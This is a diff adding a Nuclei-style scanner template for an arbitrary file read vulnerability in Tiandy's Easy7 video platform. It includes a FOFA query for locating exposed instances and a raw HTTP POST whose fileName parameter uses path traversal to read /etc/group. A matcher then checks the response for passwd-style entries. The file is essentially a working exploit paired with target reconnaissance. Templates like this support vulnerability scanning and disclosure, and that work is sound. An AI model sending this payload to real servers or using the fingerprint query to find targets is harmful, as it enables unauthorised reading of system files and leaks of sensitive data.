@@ -1,0 +1,28 @@
+id: TianDiWeiYe-Easy7-download-File-Reading
+
+info:
+  name: 天地伟业Easy7 /Easy7/rest/file/download 任意文件读取
+  author: HuanXiong
+  severity: medium
+  description: |-
+    fofa: body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7_logo_transparent.png") && title="平台"
+    天地伟业 Easy7 /Easy7/rest/file/download 接口存在任意文件读取漏洞，攻击者可通过构造恶意HTTP请求，利用漏洞接口/路径触发漏洞，读取服务器敏感文件内容，导致敏感信息泄露，危害系统安全。
+  reference:
+    - 
+  tags: file-reading, tiandy, easy7
+
+http:
+  - raw:
+      - |-
+        POST /Easy7/rest/file/download HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+        fileName=../../../../etc/group&uploadPicturePath=/&fullName=1.png
+
+    matchers:
+      - type: dsl
+        name: 任意文件读取
+        dsl:
+          - "status_code == 200 && contains_all(body, 'root:x:', 'bin:x:', 'daemon:x:')"
